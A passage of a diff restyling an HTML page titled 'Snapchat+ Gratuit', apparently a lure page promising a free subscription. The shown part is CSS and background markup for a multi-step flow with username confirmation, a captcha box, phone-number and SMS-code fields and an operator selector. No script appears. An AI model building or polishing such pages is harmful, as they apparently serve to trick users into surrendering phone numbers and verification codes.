@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat+ Gratuit</title>
-    <!-- Google Font -->
+    <title>Snapchat+ Gratuit - Black & Gold</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <style>
         /* ================= RESET & BASE ================= */
@@ -13,19 +12,18 @@
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: 'Inter', sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background: #0a0a0f;
+            background: #0a0a0a;
             overflow: hidden;
             position: relative;
         }
 
-        /* ================= FOND ANIMÉ ================= */
+        /* ================= FOND BLACK & GOLD ULTIME ================= */
         .background {
             position: fixed;
             top: 0;
@@ -33,108 +31,167 @@
             width: 100%;
             height: 100%;
             z-index: 0;
-            background: radial-gradient(ellipse at 20% 50%, #1a1a2e 0%, #16213e 40%, #0f0f1a 100%);
-        }
-
-        .background::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: conic-gradient(from 0deg at 50% 50%, #fffc00, #ff007f, #7000ff, #00d4ff, #fffc00);
-            opacity: 0.08;
-            animation: rotateBg 30s linear infinite;
-        }
-
-        @keyframes rotateBg {
-            to { transform: rotate(360deg); }
-        }
-
-        .particles {
-            position: absolute;
-            width: 100%;
-            height: 100%;
+            background: #0a0a0a;
             overflow: hidden;
         }
 
-        .particle {
+        .background .glow-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 80vmax;
+            height: 80vmax;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.15) 0%, rgba(255, 215, 0, 0.05) 40%, transparent 70%);
+            border-radius: 50%;
+            animation: pulseGlow 4s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes pulseGlow {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
+            50% { transform: translate(-50%, -50%) scale(1.3); opacity: 1; }
+        }
+
+        .background .grid-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image:
+                linear-gradient(rgba(255, 215, 0, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 215, 0, 0.03) 1px, transparent 1px);
+            background-size: 60px 60px;
+            pointer-events: none;
+            animation: gridShift 20s linear infinite;
+        }
+        @keyframes gridShift {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(60px, 60px); }
+        }
+
+        .particles-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .particle-gold {
             position: absolute;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.04);
-            animation: floatParticle linear infinite;
+            background: radial-gradient(circle, #ffd700, #ff8c00);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.4);
+            animation: floatGold linear infinite;
+            opacity: 0;
+        }
+        .particle-gold:nth-child(1) { width: 6px; height: 6px; left: 5%; top: 10%; animation-duration: 14s; animation-delay: 0s; }
+        .particle-gold:nth-child(2) { width: 10px; height: 10px; left: 15%; top: 70%; animation-duration: 18s; animation-delay: 2s; }
+        .particle-gold:nth-child(3) { width: 4px; height: 4px; left: 25%; top: 20%; animation-duration: 12s; animation-delay: 4s; }
+        .particle-gold:nth-child(4) { width: 8px; height: 8px; left: 35%; top: 80%; animation-duration: 20s; animation-delay: 1s; }
+        .particle-gold:nth-child(5) { width: 5px; height: 5px; left: 45%; top: 15%; animation-duration: 16s; animation-delay: 3s; }
+        .particle-gold:nth-child(6) { width: 12px; height: 12px; left: 55%; top: 65%; animation-duration: 22s; animation-delay: 5s; }
+        .particle-gold:nth-child(7) { width: 7px; height: 7px; left: 65%; top: 30%; animation-duration: 15s; animation-delay: 2.5s; }
+        .particle-gold:nth-child(8) { width: 9px; height: 9px; left: 75%; top: 85%; animation-duration: 19s; animation-delay: 0.5s; }
+        .particle-gold:nth-child(9) { width: 4px; height: 4px; left: 85%; top: 45%; animation-duration: 13s; animation-delay: 3.5s; }
+        .particle-gold:nth-child(10) { width: 11px; height: 11px; left: 92%; top: 10%; animation-duration: 21s; animation-delay: 1.5s; }
+        .particle-gold:nth-child(11) { width: 6px; height: 6px; left: 8%; top: 55%; animation-duration: 17s; animation-delay: 4.5s; }
+        .particle-gold:nth-child(12) { width: 8px; height: 8px; left: 50%; top: 5%; animation-duration: 23s; animation-delay: 0.8s; }
+        .particle-gold:nth-child(13) { width: 5px; height: 5px; left: 70%; top: 50%; animation-duration: 14.5s; animation-delay: 2.2s; }
+        .particle-gold:nth-child(14) { width: 10px; height: 10px; left: 30%; top: 45%; animation-duration: 19.5s; animation-delay: 3.8s; }
+        .particle-gold:nth-child(15) { width: 7px; height: 7px; left: 60%; top: 75%; animation-duration: 16.5s; animation-delay: 1.2s; }
+        @keyframes floatGold {
+            0% { transform: translateY(0) rotate(0deg) scale(1); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-110vh) rotate(720deg) scale(0.5); opacity: 0; }
+        }
+
+        .background .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #ffd700, #ff8c00, #ffd700, transparent);
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
+            animation: scanMove 8s linear infinite;
+            pointer-events: none;
+            opacity: 0.3;
+        }
+        @keyframes scanMove {
+            0% { top: -5%; }
+            100% { top: 105%; }
+        }
+
+        .background .vignette {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(ellipse at center, transparent 50%, rgba(0, 0, 0, 0.7) 100%);
             pointer-events: none;
         }
 
-        .particle:nth-child(1) { width: 80px; height: 80px; top: 10%; left: 5%; animation-duration: 18s; }
-        .particle:nth-child(2) { width: 120px; height: 120px; bottom: 15%; right: 8%; animation-duration: 25s; }
-        .particle:nth-child(3) { width: 60px; height: 60px; top: 40%; left: 80%; animation-duration: 14s; }
-        .particle:nth-child(4) { width: 100px; height: 100px; bottom: 30%; left: 10%; animation-duration: 22s; }
-        .particle:nth-child(5) { width: 40px; height: 40px; top: 70%; left: 50%; animation-duration: 12s; }
-
-        @keyframes floatParticle {
-            0% { transform: translate(0, 0) scale(1); opacity: 0.3; }
-            25% { transform: translate(30px, -40px) scale(1.2); opacity: 0.6; }
-            50% { transform: translate(-20px, -80px) scale(0.8); opacity: 0.2; }
-            75% { transform: translate(40px, -30px) scale(1.4); opacity: 0.7; }
-            100% { transform: translate(-10px, 0) scale(1); opacity: 0.3; }
-        }
-
-        /* ================= CARTE ================= */
+        /* ================= CARTE PRINCIPALE ================= */
         .card {
             position: relative;
             z-index: 10;
             width: 100%;
             max-width: 480px;
-            background: rgba(255, 255, 255, 0.06);
-            backdrop-filter: blur(24px) saturate(1.6);
-            -webkit-backdrop-filter: blur(24px) saturate(1.6);
+            background: rgba(10, 10, 10, 0.78);
+            backdrop-filter: blur(24px) saturate(1.4);
+            -webkit-backdrop-filter: blur(24px) saturate(1.4);
             border-radius: 40px;
-            padding: 32px 28px 40px;
-            border: 1px solid rgba(255, 255, 255, 0.10);
-            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.03) inset;
-            margin: 20px;
-            transition: all 0.3s ease;
+            padding: 28px 24px 34px;
+            border: 1px solid rgba(255, 215, 0, 0.18);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(255, 215, 0, 0.05) inset;
+            margin: 16px;
+            max-height: 98vh;
+            overflow-y: auto;
+        }
+        .card::-webkit-scrollbar {
+            width: 4px;
+        }
+        .card::-webkit-scrollbar-thumb {
+            background: #ffd700;
+            border-radius: 10px;
+        }
+        .card::-webkit-scrollbar-track {
+            background: transparent;
         }
 
-        /* ================= LOGO AVEC TON IMAGE ================= */
+        /* ================= LOGO ================= */
         .logo-wrapper {
             display: flex;
             justify-content: center;
-            margin-bottom: 18px;
+            margin-bottom: 14px;
         }
-
         .logo-snap {
-            width: 72px;
-            height: 72px;
-            background: transparent;
+            width: 68px;
+            height: 68px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 12px 30px rgba(255, 252, 0, 0.30), 0 0 60px rgba(255, 252, 0, 0.10);
+            box-shadow: 0 12px 30px rgba(255, 215, 0, 0.25), 0 0 60px rgba(255, 215, 0, 0.08);
             position: relative;
             overflow: hidden;
-            border: 2px solid rgba(255, 252, 0, 0.20);
+            border: 2px solid rgba(255, 215, 0, 0.20);
             transition: all 0.4s ease;
         }
-
         .logo-snap:hover {
-            transform: scale(1.05) rotate(-5deg);
-            box-shadow: 0 12px 40px rgba(255, 252, 0, 0.50), 0 0 80px rgba(255, 252, 0, 0.20);
-            border-color: rgba(255, 252, 0, 0.50);
+            transform: scale(1.05) rotate(-3deg);
         }
-
         .logo-snap img {
             width: 100%;
             height: 100%;
             object-fit: cover;
             border-radius: 50%;
-            transition: all 0.4s ease;
         }
-
-        /* PULSATION AUTOUR DU LOGO */
         .logo-snap::before {
             content: '';
             position: absolute;
@@ -143,508 +200,669 @@
             right: -4px;
             bottom: -4px;
             border-radius: 50%;
-            background: conic-gradient(from 0deg, #fffc00, #ff007f, #7000ff, #00d4ff, #fffc00);
-            opacity: 0.3;
+            background: conic-gradient(from 0deg, #ffd700, #ff8c00, #ffd700);
+            opacity: 0.25;
             z-index: -1;
             animation: spinBorder 6s linear infinite;
         }
-
         @keyframes spinBorder {
             to { transform: rotate(360deg); }
         }
 
+        /* ================= EN-TÊTE ================= */
         .badge-offer {
-            background: rgba(255, 50, 80, 0.18);
-            border: 1px solid rgba(255, 50, 80, 0.25);
-            color: #ff6b7a;
-            font-size: 11px;
+            background: rgba(255, 215, 0, 0.12);
+            border: 1px solid rgba(255, 215, 0, 0.20);
+            color: #ffd700;
+            font-size: 10px;
             font-weight: 700;
             letter-spacing: 1.5px;
             text-transform: uppercase;
-            padding: 6px 16px;
+            padding: 4px 14px;
             border-radius: 40px;
             display: inline-block;
-            margin: 0 auto 10px;
-            backdrop-filter: blur(4px);
+            margin: 0 auto 8px;
         }
-
         .header-center {
             text-align: center;
         }
-
         .header-center h1 {
-            font-size: 26px;
+            font-size: 24px;
             font-weight: 800;
             color: #fff;
-            letter-spacing: -0.5px;
-            margin-top: 4px;
+            letter-spacing: -0.3px;
         }
-
         .header-center h1 span {
-            background: linear-gradient(135deg, #fffc00, #ffb800);
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
-
         .sub-head {
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 14px;
+            color: rgba(255, 255, 255, 0.45);
+            font-size: 13px;
             font-weight: 400;
-            margin-top: 4px;
-            letter-spacing: 0.2px;
+            margin-top: 2px;
         }
-
         .stats {
             display: flex;
             justify-content: center;
-            gap: 18px;
-            margin: 14px 0 20px;
-            font-size: 13px;
-            color: rgba(255, 255, 255, 0.6);
+            gap: 16px;
+            margin: 10px 0 16px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
         }
-
         .stats strong {
-            color: #fffc00;
+            color: #ffd700;
             font-weight: 700;
         }
 
-        /* ================= ÉTAPES ================= */
+        /* ================= INDICATEUR D'ÉTAPES ================= */
         .step-indicator {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 28px;
+            margin-bottom: 22px;
             position: relative;
+            padding: 0 4px;
         }
-
         .step-indicator::before {
             content: '';
             position: absolute;
             top: 14px;
-            left: 20px;
-            right: 20px;
+            left: 16px;
+            right: 16px;
             height: 2px;
-            background: rgba(255, 255, 255, 0.10);
+            background: rgba(255, 255, 255, 0.08);
             border-radius: 4px;
             z-index: 0;
         }
-
         .step-dot {
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 6px;
+            gap: 4px;
             z-index: 1;
             flex: 1;
         }
-
         .step-dot .circle {
-            width: 32px;
-            height: 32px;
+            width: 28px;
+            height: 28px;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.06);
-            border: 2px solid rgba(255, 255, 255, 0.12);
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.08);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 13px;
+            font-size: 11px;
             font-weight: 700;
-            color: rgba(255, 255, 255, 0.25);
+            color: rgba(255, 255, 255, 0.2);
             transition: all 0.4s ease;
         }
-
         .step-dot.active .circle {
-            background: #fffc00;
-            border-color: #fffc00;
+            background: #ffd700;
+            border-color: #ffd700;
             color: #000;
-            box-shadow: 0 0 30px rgba(255, 252, 0, 0.30);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
         }
-
         .step-dot.done .circle {
-            background: rgba(255, 252, 0, 0.15);
-            border-color: #fffc00;
-            color: #fffc00;
+            background: rgba(255, 215, 0, 0.15);
+            border-color: #ffd700;
+            color: #ffd700;
         }
-
         .step-dot .label {
-            font-size: 10px;
-            color: rgba(255, 255, 255, 0.30);
+            font-size: 9px;
+            color: rgba(255, 255, 255, 0.25);
             text-transform: uppercase;
             letter-spacing: 0.5px;
             font-weight: 600;
         }
-
         .step-dot.active .label {
-            color: #fffc00;
+            color: #ffd700;
         }
 
-        /* ================= CONTENU ÉTAPES ================= */
+        /* ================= CONTENU ================= */
         .step-content {
             display: none;
-            animation: fadeUp 0.45s ease forwards;
+            animation: fadeUp 0.4s ease forwards;
         }
-
         .step-content.active {
             display: block;
         }
-
         @keyframes fadeUp {
-            from { opacity: 0; transform: translateY(16px); }
+            from { opacity: 0; transform: translateY(12px); }
             to { opacity: 1; transform: translateY(0); }
         }
-
         .step-title {
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 700;
             color: #fff;
-            margin-bottom: 4px;
+            margin-bottom: 2px;
         }
-
         .step-desc {
             font-size: 13px;
             color: rgba(255, 255, 255, 0.45);
-            margin-bottom: 18px;
+            margin-bottom: 14px;
             line-height: 1.5;
         }
 
         /* ================= FORMULAIRES ================= */
         .input-group {
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
-
         .input-group label {
             display: block;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
-            color: rgba(255, 255, 255, 0.5);
+            color: rgba(255, 255, 255, 0.45);
             text-transform: uppercase;
-            letter-spacing: 0.8px;
-            margin-bottom: 6px;
+            letter-spacing: 0.6px;
+            margin-bottom: 5px;
         }
-
-        .input-group input {
+        .input-group input,
+        .input-group select {
             width: 100%;
-            padding: 14px 18px;
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            background: rgba(255, 255, 255, 0.04);
+            padding: 12px 16px;
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.03);
             color: #fff;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 500;
             transition: all 0.2s;
             outline: none;
             font-family: 'Inter', sans-serif;
         }
-
-        .input-group input:focus {
-            border-color: #fffc00;
-            background: rgba(255, 252, 0, 0.05);
-            box-shadow: 0 0 30px rgba(255, 252, 0, 0.05);
+        .input-group select option {
+            background: #1a1a2e;
+            color: #fff;
         }
-
+        .input-group input:focus,
+        .input-group select:focus {
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.05);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.05);
+        }
         .input-group input::placeholder {
-            color: rgba(255, 255, 255, 0.20);
+            color: rgba(255, 255, 255, 0.15);
         }
-
         .input-hint {
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.25);
-            margin-top: 6px;
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.2);
+            margin-top: 4px;
         }
 
         /* ================= CHECKBOX ================= */
         .confirm-box {
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 16px;
-            padding: 16px 18px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 14px;
+            padding: 14px 16px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
             display: flex;
             align-items: center;
-            gap: 14px;
-            margin: 12px 0 18px;
+            gap: 12px;
+            margin: 10px 0 16px;
             cursor: pointer;
             transition: all 0.2s;
         }
-
         .confirm-box:hover {
-            background: rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.04);
         }
-
         .confirm-box .avatar {
-            width: 44px;
-            height: 44px;
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
-            background: linear-gradient(135deg, #fffc00, #ffb800);
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 800;
-            font-size: 18px;
+            font-size: 16px;
             color: #000;
             flex-shrink: 0;
         }
-
         .confirm-box .info {
             flex: 1;
         }
-
         .confirm-box .info .username {
             font-weight: 700;
             color: #fff;
-            font-size: 15px;
+            font-size: 14px;
         }
-
         .confirm-box .info .sub {
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.30);
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.25);
         }
-
         .confirm-box .check {
-            width: 26px;
-            height: 26px;
+            width: 24px;
+            height: 24px;
             border-radius: 50%;
-            border: 2px solid rgba(255, 255, 255, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.1);
             display: flex;
             align-items: center;
             justify-content: center;
             transition: all 0.2s;
             flex-shrink: 0;
         }
-
         .confirm-box.checked .check {
-            background: #fffc00;
-            border-color: #fffc00;
+            background: #ffd700;
+            border-color: #ffd700;
         }
-
         .confirm-box.checked .check::after {
             content: '✓';
             color: #000;
             font-weight: 800;
-            font-size: 16px;
+            font-size: 14px;
         }
 
-        /* ================= BARRE DE PROGRÈS ================= */
+        /* ================= PROGRESS ================= */
         .progress-wrap {
-            margin: 20px 0 16px;
+            margin: 16px 0 14px;
         }
-
         .progress-bar-bg {
             width: 100%;
-            height: 8px;
-            background: rgba(255, 255, 255, 0.06);
+            height: 6px;
+            background: rgba(255, 255, 255, 0.05);
             border-radius: 20px;
             overflow: hidden;
         }
-
         .progress-bar-fill {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #fffc00, #ffb800);
+            background: linear-gradient(90deg, #ffd700, #ff8c00);
             border-radius: 20px;
             transition: width 0.25s ease;
-            box-shadow: 0 0 20px rgba(255, 252, 0, 0.30);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.25);
         }
-
         .progress-text {
             display: flex;
             justify-content: space-between;
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.40);
-            margin-top: 6px;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.35);
+            margin-top: 4px;
         }
-
         .progress-text .pct {
             font-weight: 700;
-            color: #fffc00;
+            color: #ffd700;
         }
 
-        .status-msg {
-            font-size: 13px;
-            color: rgba(255, 255, 255, 0.50);
-            text-align: center;
-            margin: 10px 0 6px;
-            font-weight: 400;
-        }
-
-        /* ================= CAPTCHA / NUMÉRO / CODE ================= */
+        /* ================= CAPTCHA / OPÉRATEUR ================= */
         .captcha-box {
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 16px;
-            padding: 16px 18px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 14px;
+            padding: 14px 16px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
             display: flex;
             align-items: center;
-            gap: 14px;
-            margin: 12px 0 18px;
+            gap: 12px;
+            margin: 10px 0 16px;
             transition: all 0.3s;
             cursor: pointer;
         }
-
         .captcha-box .checkbox-big {
-            width: 32px;
-            height: 32px;
+            width: 28px;
+            height: 28px;
             border-radius: 6px;
-            border: 2px solid rgba(255, 255, 255, 0.15);
-            background: rgba(255, 255, 255, 0.03);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.02);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 700;
             color: #000;
             transition: all 0.2s;
             flex-shrink: 0;
         }
-
         .captcha-box .checkbox-big.checked {
-            background: #fffc00;
-            border-color: #fffc00;
+            background: #ffd700;
+            border-color: #ffd700;
         }
-
         .captcha-box .checkbox-big.checked::after {
             content: '✓';
         }
-
         .captcha-box .captcha-text {
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.5);
             font-weight: 400;
         }
-
         .captcha-box .captcha-text strong {
             color: #fff;
         }
 
-        .phone-field, .code-field {
+        .phone-field,
+        .code-field {
             display: none;
-            margin-top: 12px;
+            margin-top: 10px;
             animation: fadeUp 0.3s ease;
         }
-
-        .phone-field.visible, .code-field.visible {
+        .phone-field.visible,
+        .code-field.visible {
             display: block;
         }
 
-        .phone-field input, .code-field input {
-            width: 100%;
-            padding: 14px 18px;
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            background: rgba(255, 255, 255, 0.04);
-            color: #fff;
-            font-size: 16px;
-            font-weight: 500;
-            outline: none;
-            font-family: 'Inter', sans-serif;
-            margin-bottom: 10px;
+        /* ================= OPÉRATEUR ================= */
+        .operator-selector {
+            margin: 10px 0 16px;
         }
-
-        .phone-field input:focus, .code-field input:focus {
-            border-color: #fffc00;
+        .operator-selector .operator-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+        .operator-selector .operator-btn {
+            padding: 10px 6px;
+            border-radius: 12px;
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.02);
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-align: center;
+            position: relative;
+        }
+        .operator-selector .operator-btn:hover:not(.disabled) {
+            border-color: rgba(255, 255, 255, 0.15);
+            background: rgba(255, 255, 255, 0.04);
+        }
+        .operator-selector .operator-btn.selected {
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.08);
+            color: #fff;
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.06);
+        }
+        .operator-selector .operator-btn.disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            border-color: #ff4444;
+            background: rgba(255, 68, 68, 0.04);
+        }
+        .operator-selector .operator-btn .badge-block {
+            position: absolute;
+            top: -6px;
+            right: -6px;
+            background: #ff4444;
+            color: #fff;
+            font-size: 7px;
+            font-weight: 800;
+            padding: 2px 7px;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .operator-message {
+            margin-top: 6px;
+            font-size: 11px;
+            text-align: center;
+            min-height: 20px;
+            transition: all 0.3s;
+        }
+        .operator-message.error {
+            color: #ff6b7a;
+        }
+        .operator-message.success {
+            color: #ffd700;
+        }
+        .operator-message.info {
+            color: rgba(255, 255, 255, 0.25);
         }
 
         /* ================= BOUTONS ================= */
         .btn-primary {
             width: 100%;
-            padding: 16px;
+            padding: 14px;
             border: none;
             border-radius: 60px;
-            background: linear-gradient(135deg, #fffc00, #ffb800);
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
             color: #000;
             font-weight: 800;
-            font-size: 16px;
+            font-size: 15px;
             font-family: 'Inter', sans-serif;
             cursor: pointer;
             transition: all 0.25s ease;
-            box-shadow: 0 8px 30px rgba(255, 252, 0, 0.20);
-            letter-spacing: 0.3px;
-            margin-top: 8px;
+            box-shadow: 0 8px 30px rgba(255, 215, 0, 0.15);
+            letter-spacing: 0.2px;
+            margin-top: 6px;
         }
-
         .btn-primary:hover {
-            transform: scale(1.02);
-            box-shadow: 0 12px 40px rgba(255, 252, 0, 0.35);
+            transform: scale(1.01);
+            box-shadow: 0 12px 40px rgba(255, 215, 0, 0.25);
         }
-
         .btn-primary:active {
             transform: scale(0.97);
         }
-
         .btn-primary:disabled {
             opacity: 0.3;
             cursor: not-allowed;
             transform: none !important;
             box-shadow: none !important;
         }
-
         .btn-secondary {
             width: 100%;
-            padding: 14px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 60px;
-            background: rgba(255, 255, 255, 0.03);
-            color: rgba(255, 255, 255, 0.5);
+            background: rgba(255, 255, 255, 0.02);
+            color: rgba(255, 255, 255, 0.4);
             font-weight: 600;
-            font-size: 14px;
+            font-size: 13px;
             font-family: 'Inter', sans-serif;
             cursor: pointer;
             transition: all 0.2s;
-            margin-top: 8px;
+            margin-top: 6px;
         }
-
         .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.04);
             color: #fff;
         }
 
         /* ================= FOOTER ================= */
         .footer-note {
             text-align: center;
-            margin-top: 18px;
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.15);
+            margin-top: 14px;
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.1);
             letter-spacing: 0.3px;
         }
 
-        .footer-note span {
-            color: rgba(255, 255, 255, 0.08);
+        /* ================= MODAL ================= */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(8px);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .modal-box {
+            background: #0a0a0a;
+            border-radius: 28px;
+            padding: 28px 24px;
+            max-width: 380px;
+            width: 90%;
+            border: 1px solid rgba(255, 215, 0, 0.15);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.9);
+            text-align: center;
+            animation: slideUp 0.4s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .modal-box .icon {
+            font-size: 40px;
+            margin-bottom: 8px;
+        }
+        .modal-box h2 {
+            color: #ffd700;
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 6px;
+        }
+        .modal-box p {
+            color: rgba(255, 255, 255, 0.45);
+            font-size: 13px;
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+        .modal-box .btn-modal {
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            border: none;
+            color: #000;
+            font-weight: 700;
+            padding: 12px 28px;
+            border-radius: 60px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+        .modal-box .btn-modal:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
+        }
+        .modal-box .btn-secondary-modal {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            color: rgba(255, 255, 255, 0.3);
+            font-weight: 600;
+            padding: 10px 20px;
+            border-radius: 60px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+            font-family: 'Inter', sans-serif;
+        }
+        .modal-box .btn-secondary-modal:hover {
+            background: rgba(255, 255, 255, 0.06);
+            color: #fff;
         }
 
         /* ================= RESPONSIVE ================= */
         @media (max-width: 480px) {
             .card {
-                padding: 24px 18px 30px;
+                padding: 20px 16px 26px;
                 border-radius: 28px;
-                margin: 12px;
+                margin: 10px;
+                max-height: 96vh;
             }
-            .logo-snap { width: 60px; height: 60px; }
-            .header-center h1 { font-size: 22px; }
-            .step-dot .circle { width: 28px; height: 28px; font-size: 11px; }
+            .logo-snap {
+                width: 56px;
+                height: 56px;
+            }
+            .header-center h1 {
+                font-size: 20px;
+            }
+            .step-dot .circle {
+                width: 24px;
+                height: 24px;
+                font-size: 10px;
+            }
+            .step-dot .label {
+                font-size: 8px;
+            }
+            .operator-selector .operator-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 6px;
+            }
+            .operator-selector .operator-btn {
+                font-size: 12px;
+                padding: 8px 4px;
+            }
+            .modal-box {
+                padding: 22px 18px;
+            }
+        }
+        @media (max-width: 380px) {
+            .card {
+                padding: 16px 12px 20px;
+            }
+            .stats {
+                font-size: 10px;
+                gap: 10px;
+                flex-wrap: wrap;
+            }
+            .step-indicator {
+                margin-bottom: 14px;
+            }
+            .step-indicator::before {
+                top: 12px;
+                left: 10px;
+                right: 10px;
+            }
         }
     </style>
 </head>
 <body>
 
-    <!-- ============ FOND ============ -->
+    <!-- ================================================================ -->
+    <!-- FOND BLACK & GOLD                                                -->
+    <!-- ================================================================ -->
     <div class="background">
-        <div class="particles">
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
-            <div class="particle"></div>
+        <div class="glow-center"></div>
+        <div class="grid-overlay"></div>
+        <div class="particles-container">
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+            <div class="particle-gold"></div>
+        </div>
+        <div class="scan-line"></div>
+        <div class="vignette"></div>
+    </div>
+
